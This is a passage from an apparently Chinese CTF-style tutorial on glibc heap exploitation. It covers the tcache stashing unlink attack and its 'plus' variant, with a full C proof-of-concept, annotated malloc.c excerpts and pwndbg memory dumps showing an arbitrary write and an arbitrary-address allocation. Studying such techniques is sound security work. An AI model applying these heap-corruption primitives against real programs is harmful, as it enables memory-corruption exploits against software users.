tcache_entry[<span class="hljs-string">4</span>](<span class="hljs-link">6</span>): 0x5555555594a0 --&gt; 0x555555559440 --&gt; 0x5555555593e0 --&gt; 0x555555559380 --&gt; 0x555555559320 --&gt; 0x5555555592c0</code></pre></div><p>先往tcache 中0x60的bin chain 上放入6个bin.。</p><p>接着将两个大小相同的块（如<code>tcache_entry</code>）释放到相应的smallbin中。</p><div class="hljs"><pre><code class="hljs c">s1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x420</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Alloc a chunk %p, whose size is beyond tcache size threshold\n"</span>, s1);pad = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Alloc a padding chunk, avoid %p to merge to top chunk\n"</span>, s1);<span class="hljs-built_in">free</span>(s1);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Free chunk %p to unsortedbin\n"</span>, s1);</code></pre></div><div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; heapinfo(<span class="hljs-number">0x20</span>)     fastbin[<span class="hljs-number">0</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x30</span>)     fastbin[<span class="hljs-number">1</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x40</span>)     fastbin[<span class="hljs-number">2</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x50</span>)     fastbin[<span class="hljs-number">3</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x60</span>)     fastbin[<span class="hljs-number">4</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x70</span>)     fastbin[<span class="hljs-number">5</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x80</span>)     fastbin[<span class="hljs-number">6</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x90</span>)     fastbin[<span class="hljs-number">7</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0xa0</span>)     fastbin[<span class="hljs-number">8</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0xb0</span>)     fastbin[<span class="hljs-number">9</span>]: <span class="hljs-number">0x0</span>                  top: <span class="hljs-number">0x555555559950</span> (size : <span class="hljs-number">0x206b0</span>)        last_remainder: <span class="hljs-number">0x0</span> (size : <span class="hljs-number">0x0</span>)             unsortbin: <span class="hljs-number">0x5555555594f0</span> (size : <span class="hljs-number">0x430</span>)</code></pre></div><div class="hljs"><pre><code class="hljs c"><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x3c0</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\n"</span>);<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);</code></pre></div><div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; heapinfo(<span class="hljs-number">0x20</span>)     fastbin[<span class="hljs-number">0</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x30</span>)     fastbin[<span class="hljs-number">1</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x40</span>)     fastbin[<span class="hljs-number">2</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x50</span>)     fastbin[<span class="hljs-number">3</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x60</span>)     fastbin[<span class="hljs-number">4</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x70</span>)     fastbin[<span class="hljs-number">5</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x80</span>)     fastbin[<span class="hljs-number">6</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x90</span>)     fastbin[<span class="hljs-number">7</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0xa0</span>)     fastbin[<span class="hljs-number">8</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0xb0</span>)     fastbin[<span class="hljs-number">9</span>]: <span class="hljs-number">0x0</span>                  top: <span class="hljs-number">0x555555559950</span> (size : <span class="hljs-number">0x206b0</span>)        last_remainder: <span class="hljs-number">0x5555555598c0</span> (size : <span class="hljs-number">0x60</span>)             unsortbin: <span class="hljs-number">0x5555555598c0</span> (size : <span class="hljs-number">0x60</span>)(<span class="hljs-number">0x60</span>)   tcache_entry[<span class="hljs-number">4</span>](<span class="hljs-number">6</span>): <span class="hljs-number">0x5555555594a0</span> --&gt; <span class="hljs-number">0x555555559440</span> --&gt; <span class="hljs-number">0x5555555593e0</span> --&gt; <span class="hljs-number">0x555555559380</span> --&gt; <span class="hljs-number">0x555555559320</span> --&gt; <span class="hljs-number">0x5555555592c0</span></code></pre></div><p>可以看到0x5555555598c0是在<code>last_remainder</code>之中的，由于其不会进入tcache的特性，就可以进入到smallbin中。</p><div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; heapinfo(<span class="hljs-number">0x20</span>)     fastbin[<span class="hljs-number">0</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x30</span>)     fastbin[<span class="hljs-number">1</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x40</span>)     fastbin[<span class="hljs-number">2</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x50</span>)     fastbin[<span class="hljs-number">3</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x60</span>)     fastbin[<span class="hljs-number">4</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x70</span>)     fastbin[<span class="hljs-number">5</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x80</span>)     fastbin[<span class="hljs-number">6</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x90</span>)     fastbin[<span class="hljs-number">7</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0xa0</span>)     fastbin[<span class="hljs-number">8</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0xb0</span>)     fastbin[<span class="hljs-number">9</span>]: <span class="hljs-number">0x0</span>                  top: <span class="hljs-number">0x555555559a60</span> (size : <span class="hljs-number">0x205a0</span>)        last_remainder: <span class="hljs-number">0x5555555598c0</span> (size : <span class="hljs-number">0x60</span>)             unsortbin: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x060</span>)  smallbin[ <span class="hljs-number">4</span>]: <span class="hljs-number">0x5555555598c0</span>(<span class="hljs-number">0x60</span>)   tcache_entry[<span class="hljs-number">4</span>](<span class="hljs-number">6</span>): <span class="hljs-number">0x5555555594a0</span> --&gt; <span class="hljs-number">0x555555559440</span> --&gt; <span class="hljs-number">0x5555555593e0</span> --&gt; <span class="hljs-number">0x555555559380</span> --&gt; <span class="hljs-number">0x555555559320</span> --&gt; <span class="hljs-number">0x5555555592c0</span></code></pre></div><p>接着重复这个步骤，在构造一个进入smallbin的chunk。</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">"Repeat the above steps, and free another chunk into corresponding smallbin\n"</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\n"</span>);s2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x420</span>);pad = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>); <span class="hljs-comment">//防止合并的pad chunk，其必须大于0x60</span><span class="hljs-built_in">free</span>(s2);<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x3c0</span>);<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);</code></pre></div><div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; heapinfo(<span class="hljs-number">0x20</span>)     fastbin[<span class="hljs-number">0</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x30</span>)     fastbin[<span class="hljs-number">1</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x40</span>)     fastbin[<span class="hljs-number">2</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x50</span>)     fastbin[<span class="hljs-number">3</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x60</span>)     fastbin[<span class="hljs-number">4</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x70</span>)     fastbin[<span class="hljs-number">5</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x80</span>)     fastbin[<span class="hljs-number">6</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x90</span>)     fastbin[<span class="hljs-number">7</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0xa0</span>)     fastbin[<span class="hljs-number">8</span>]: <span class="hljs-number">0x0</span>(<span class="hljs-number">0xb0</span>)     fastbin[<span class="hljs-number">9</span>]: <span class="hljs-number">0x0</span>                  top: <span class="hljs-number">0x55555555a030</span> (size : <span class="hljs-number">0x1ffd0</span>)        last_remainder: <span class="hljs-number">0x555555559e30</span> (size : <span class="hljs-number">0x60</span>)             unsortbin: <span class="hljs-number">0x0</span>(<span class="hljs-number">0x060</span>)  smallbin[ <span class="hljs-number">4</span>]: <span class="hljs-number">0x555555559e30</span>  &lt;--&gt; <span class="hljs-number">0x5555555598c0</span>(<span class="hljs-number">0x60</span>)   tcache_entry[<span class="hljs-number">4</span>](<span class="hljs-number">6</span>): <span class="hljs-number">0x5555555594a0</span> --&gt; <span class="hljs-number">0x555555559440</span> --&gt; <span class="hljs-number">0x5555555593e0</span> --&gt; <span class="hljs-number">0x555555559380</span> --&gt; <span class="hljs-number">0x555555559320</span> --&gt; <span class="hljs-number">0x5555555592c0</span></code></pre></div><p>可以看到已经完成构造了。接着进行change 0x555555559e30 的bk为目标地址-0x10。</p><div class="hljs"><pre><code class="hljs c">*(<span class="hljs-keyword">uint64_t</span>*)((s2+<span class="hljs-number">0x3c0</span>)+<span class="hljs-number">0x18</span>) = (<span class="hljs-keyword">uint64_t</span>)(&amp;victim)<span class="hljs-number">-0x10</span>;</code></pre></div><p>原始：</p><div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x555555559e30</span><span class="hljs-number">0x555555559e30</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000061</span><span class="hljs-number">0x555555559e40</span>: <span class="hljs-number">0x00005555555598c0</span>      <span class="hljs-number">0x00007ffff7fb9c30</span></code></pre></div><p>change 后：</p><div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x555555559e30</span><span class="hljs-number">0x555555559e30</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000061</span><span class="hljs-number">0x555555559e40</span>: <span class="hljs-number">0x00005555555598c0</span>      <span class="hljs-number">0x0000555555558040</span><span class="hljs-number">0x555555559e50</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span></code></pre></div><p>再看下即将被calloc申请到的smallbin：</p><div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x5555555598c0</span><span class="hljs-number">0x5555555598c0</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000061</span><span class="hljs-number">0x5555555598d0</span>: <span class="hljs-number">0x00007ffff7fb9c30</span>      <span class="hljs-number">0x0000555555559e30</span></code></pre></div><div class="hljs"><pre><code class="hljs c"><span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>);</code></pre></div><p>其先会进行一个解链：</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (in_smallbin_range (nb))   &#123;     idx = smallbin_index (nb);     bin = bin_at (av, idx);     <span class="hljs-keyword">if</span> ((victim = last (bin)) != bin)       &#123;         bck = victim-&gt;bk; <span class="hljs-comment">//1</span>     <span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)) <span class="hljs-comment">//2 明显是可以通过其双向链表的检查，会被正常的解链</span>       malloc_printerr (<span class="hljs-string">"malloc(): smallbin double linked list corrupted"</span>);         set_inuse_bit_at_offset (victim, nb);         bin-&gt;bk = bck;         bck-&gt;fd = bin;         <span class="hljs-keyword">if</span> (av != &amp;main_arena)       set_non_main_arena (victim);         check_malloced_chunk (av, victim, nb);</code></pre></div><p>接着会进行stash：</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span>      <span class="hljs-comment">/* While we're here, if we see other chunks of the same size,         stash them in the tcache.  */</span>      <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx (nb);      <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)        &#123;          mchunkptr tc_victim;          <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks over.  */</span>          <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count             &amp;&amp; (tc_victim = last (bin)) != bin)        &#123;          <span class="hljs-keyword">if</span> (tc_victim != <span class="hljs-number">0</span>)            &#123;              bck = tc_victim-&gt;bk;              set_inuse_bit_at_offset (tc_victim, nb);              <span class="hljs-keyword">if</span> (av != &amp;main_arena)            set_non_main_arena (tc_victim);              bin-&gt;bk = bck;              bck-&gt;fd = bin;              tcache_put (tc_victim, tc_idx);                &#125;        &#125;</code></pre></div><p>可以看到这一块，并没有进行双向链表的检查。其中<code>bck-&gt;fd = bin;</code>这个也就是对于 (&amp;tag - 0x10) + 0x10 = bin。也就是将目标地址上的值赋为 bin，这样就实现了等价于 unsortedbin Attack 的操作。</p><div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x0000555555558050</span><span class="hljs-number">0x555555558050</span> &lt;victim&gt;:        <span class="hljs-number">0x00007ffff7fb9c30</span>      <span class="hljs-number">0x0000000000000000</span></code></pre></div><p>可以看到攻击已经成功。</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x60</span>)   tcache_entry[4](7): 0x555555559e40 --&gt;</span> <span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x5555555594a0</span> --&gt;</span> <span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x555555559440</span> --&gt;</span> <span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x5555555593e0</span> --&gt;</span> <span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x555555559380</span> --&gt;</span> <span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x555555559320</span> --&gt;</span> <span class="hljs-number">0</span>x5555555592c0</code></pre></div><p>且已经满chain，结束了stash的过程。</p><p>需要注意的是，刚才描述的放入过程是一个循环，我们将伪造的bck看成一个堆块，其bk很可能是一个非法的地址，这样就导致循环到下一个堆块时unlink执行到<code>bck-&gt;fd = bin;</code>访问非法内存造成程序crash。所以开始，选择释放6个对应size的chunk到tcache bin，只为tcache留一个空间，这样循环一次就会跳出，不会有后续问题。</p><h4 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h4><ul><li>先放入 2 个 Chunk 到 smallbins，6 个 Chunk 到对应的 tcache；</li><li>然后在不破坏 fd 的情况下,将后放入 smallbins 的 chunk 的 bk 设置为目标地址减 0x10。</li><li>这样再用calloc向 smallbins 申请对应大小的 Chunk 时，先放入 smallbins 的 Chunk 被分配给用户，然后触发 stash 机制。<code>bck = tc_victim-&gt;bk;</code>此时的 bck 就是目标地址减 0x10，之后<code>bck-&gt;fd = bin;</code> 也就是将目标地址上的值赋为 bin，写上了<code>main_arena</code>的地址，这样就实现了等价于 unsortedbin attack 的操作；</li><li>之后再调用 <code>tcache_put</code> 把后放入 smallbins 的 Chunk 取出给对应的 tcache ，因为 tcache 之前已经被布置了 6 个 Chunk，在这次之后达到了阈值，所以也就退出了 stash 循环，整个流程就会正常结束。</li></ul><h3 id="tcache-stashing-unlink-plus"><a href="#tcache-stashing-unlink-plus" class="headerlink" title="tcache_stashing_unlink plus"></a><code>tcache_stashing_unlink plus</code></h3><h4 id="示例代码-1"><a href="#示例代码-1" class="headerlink" title="示例代码"></a>示例代码</h4><div class="hljs"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;inttypes.h&gt;</span></span><span class="hljs-keyword">static</span> <span class="hljs-keyword">uint64_t</span> victim[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span>&#123;setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>);setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0</span>);<span class="hljs-keyword">char</span> *t1;<span class="hljs-keyword">char</span> *s1, *s2, *pad;<span class="hljs-keyword">char</span> *tmp;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"You can use this technique to get a tcache chunk to arbitrary address\n"</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n1. need to know heap address and the victim address that you need to attack\n"</span>);tmp = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"victim's address: %p, victim's vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n"</span>, &amp;victim, victim[<span class="hljs-number">0</span>], victim[<span class="hljs-number">1</span>], victim[<span class="hljs-number">2</span>], victim[<span class="hljs-number">3</span>]);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"heap address: %p\n"</span>, tmp<span class="hljs-number">-0x260</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n2. change victim's data, make victim[1] = &amp;victim, or other address to writable address\n"</span>);<span class="hljs-comment">//只要是一个可以写的指针地址即可，不一定是&amp;victim</span>victim[<span class="hljs-number">1</span>] = (<span class="hljs-keyword">uint64_t</span>)(&amp;victim);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"victim's vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n"</span>, victim[<span class="hljs-number">0</span>], victim[<span class="hljs-number">1</span>], victim[<span class="hljs-number">2</span>], victim[<span class="hljs-number">3</span>]);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n3. choose a stable size and free five identical size chunks to tcache_entry list\n"</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Here, I choose the size 0x60\n"</span>);<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">5</span>; i++)&#123;t1 = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>);<span class="hljs-built_in">free</span>(t1);&#125;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n"</span>, t1, t1<span class="hljs-number">-0x60</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">2</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">3</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">4</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n4. free two chunk with the same size like tcache_entry into the corresponding smallbin\n"</span>);s1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x420</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Alloc a chunk %p, whose size is beyond tcache size threshold\n"</span>, s1);pad = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Alloc a padding chunk, avoid %p to merge to top chunk\n"</span>, s1);<span class="hljs-built_in">free</span>(s1);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Free chunk %p to unsortedbin\n"</span>, s1);<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x3c0</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\n"</span>);<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\n"</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"chunk %p is in smallbin[4], whose size is 0x60\n"</span>, s1+<span class="hljs-number">0x3c0</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Repeat the above steps, and free another chunk into corresponding smallbin\n"</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\n"</span>);s2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x420</span>);pad = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<span class="hljs-built_in">free</span>(s2);<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x3c0</span>);<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"chunk %p is in smallbin[4], whose size is 0x60\n"</span>, s2+<span class="hljs-number">0x3c0</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"smallbin[4] list is %p &lt;--&gt; %p\n"</span>, s2+<span class="hljs-number">0x3c0</span>, s1+<span class="hljs-number">0x3c0</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n5. overwrite the first chunk in smallbin[4]'s bk pointer to &amp;victim-0x10 address, the first chunk is smallbin[4]-&gt;fd\n"</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Change %p's bk pointer to &amp;victim-0x10 address: 0x%lx\n"</span>, s2+<span class="hljs-number">0x3c0</span>, (<span class="hljs-keyword">uint64_t</span>)(&amp;victim)<span class="hljs-number">-0x10</span>);*(<span class="hljs-keyword">uint64_t</span>*)((s2+<span class="hljs-number">0x3c0</span>)+<span class="hljs-number">0x18</span>) = (<span class="hljs-keyword">uint64_t</span>)(&amp;victim)<span class="hljs-number">-0x10</span>;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n6. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\n"</span>);<span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n"</span>, &amp;victim, s2+<span class="hljs-number">0x3d0</span>, t1, t1<span class="hljs-number">-0x60</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">2</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">3</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">4</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Apply to tcache_entry[4], you can get a pointer to victim address\n"</span>);<span class="hljs-keyword">uint64_t</span> *r = (<span class="hljs-keyword">uint64_t</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x50</span>);r[<span class="hljs-number">0</span>] = <span class="hljs-number">0xaa</span>;r[<span class="hljs-number">1</span>] = <span class="hljs-number">0xbb</span>;r[<span class="hljs-number">2</span>] = <span class="hljs-number">0xcc</span>;r[<span class="hljs-number">3</span>] = <span class="hljs-number">0xdd</span>;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"victim's vaule: [0x%lx, 0x%lx, 0x%lx, 0x%lx]\n"</span>, victim[<span class="hljs-number">0</span>], victim[<span class="hljs-number">1</span>], victim[<span class="hljs-number">2</span>], victim[<span class="hljs-number">3</span>]);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p>由于大多地方调试信息都相似，只分析一下重点处的相关信息：</p><h4 id="重点调试过程"><a href="#重点调试过程" class="headerlink" title="重点调试过程"></a>重点调试过程</h4><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-selector-tag">b</span> <span class="hljs-number">70</span></code></pre></div><p>先断在源程序代码的第70行，下面紧跟着的是calloc.<br>看下内存信息：<br>被恶意chage的smallbin chunk：</p><div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x555555559dd0</span><span class="hljs-number">0x555555559dd0</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000061</span><span class="hljs-number">0x555555559de0</span>: <span class="hljs-number">0x0000555555559860</span>      <span class="hljs-number">0x0000555555558050</span>(tag<span class="hljs-number">-0x10</span>)</code></pre></div><p>即将被取走的smallbin chunk：</p><div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x0000555555559860</span><span class="hljs-number">0x555555559860</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000061</span><span class="hljs-number">0x555555559870</span>: <span class="hljs-number">0x00007ffff7fbac30</span>      <span class="hljs-number">0x0000555555559dd0</span></code></pre></div><p>接着si进入calloc内部,进入malloc.c：</p><div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; b <span class="hljs-number">3654</span>Breakpoint <span class="hljs-number">3</span> at <span class="hljs-number">0x7ffff7e69c87</span>: file malloc.c, line <span class="hljs-number">3655.</span></code></pre></div><p>直接断在stash区进行分析:</p><h5 id="第一轮的stash："><a href="#第一轮的stash：" class="headerlink" title="第一轮的stash："></a>第一轮的stash：</h5><div class="hljs"><pre><code class="hljs c"> <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)&#123;  mchunkptr tc_victim;  <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks over.  */</span>  <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last (bin)) != bin)   <span class="hljs-comment">//#define last(b)      ((b)-&gt;bk)  也就是 tc_victim = bin-&gt;bk</span></code></pre></div><div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; p tc_victim$<span class="hljs-number">19</span> = (mchunkptr) <span class="hljs-number">0x555555559dd0</span></code></pre></div><div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x555555559dd0</span><span class="hljs-number">0x555555559dd0</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000061</span><span class="hljs-number">0x555555559de0</span>: <span class="hljs-number">0x00007ffff7fbac30</span>      <span class="hljs-number">0x0000555555558050</span></code></pre></div><div class="hljs"><pre><code class="hljs c">&#123;  <span class="hljs-keyword">if</span> (tc_victim != <span class="hljs-number">0</span>)&#123;  bck = tc_victim-&gt;bk; <span class="hljs-comment">//bck = tag-0x10</span>  set_inuse_bit_at_offset (tc_victim, nb);  <span class="hljs-keyword">if</span> (av != &amp;main_arena)set_non_main_arena (tc_victim);  bin-&gt;bk = bck; <span class="hljs-comment">//tag - 0x10 被写在bin-&gt;bk处</span>  bck-&gt;fd = bin; <span class="hljs-comment">//bin 被写在tag处</span>  <span class="hljs-comment">//将 bin 的 bk 指向 tc_victim 的后一个 Chunk，将 tc_victim 后一个 Chunk 的 fd 指向 bin，即将 tc_victim 取出</span>  tcache_put (tc_victim, tc_idx);&#125;&#125;</code></pre></div><div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x0000555555558050</span><span class="hljs-number">0x555555558050</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x555555558060</span> &lt;victim&gt;:        <span class="hljs-number">0x00007ffff7fbac30</span>      <span class="hljs-number">0x0000555555558060</span><span class="hljs-number">0x555555558070</span> &lt;victim+<span class="hljs-number">16</span>&gt;:     <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span></code></pre></div><div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x00007ffff7fbac30</span><span class="hljs-number">0x7ffff7fbac30</span> &lt;main_arena+<span class="hljs-number">176</span>&gt;:        <span class="hljs-number">0x00007ffff7fbac20</span>      <span class="hljs-number">0x00007ffff7fbac20</span><span class="hljs-number">0x7ffff7fbac40</span> &lt;main_arena+<span class="hljs-number">192</span>&gt;:        <span class="hljs-number">0x0000555555559dd0</span>      <span class="hljs-number">0x0000555555558050</span>（tag - <span class="hljs-number">0x10</span>）</code></pre></div><p>tcache 放入了 <code>tc_victim = 0x555555559de0</code></p><div class="hljs"><pre><code class="hljs undefined">(0x60)   tcache_entry[<span class="hljs-string">4</span>](<span class="hljs-link">6</span>): 0x555555559de0 --&gt; 0x555555559440 --&gt; 0x5555555593e0 --&gt; 0x555555559380 --&gt; 0x555555559320 --&gt; 0x5555555592c0</code></pre></div><h5 id="第二轮的stash："><a href="#第二轮的stash：" class="headerlink" title="第二轮的stash："></a>第二轮的stash：</h5><p>重点攻击的是<code>tc_victim</code> 也就是目标地址。</p><div class="hljs"><pre><code class="hljs undefined">pwndbg&gt; p tc_victim$<span class="hljs-number">21</span> = (mchunkptr) <span 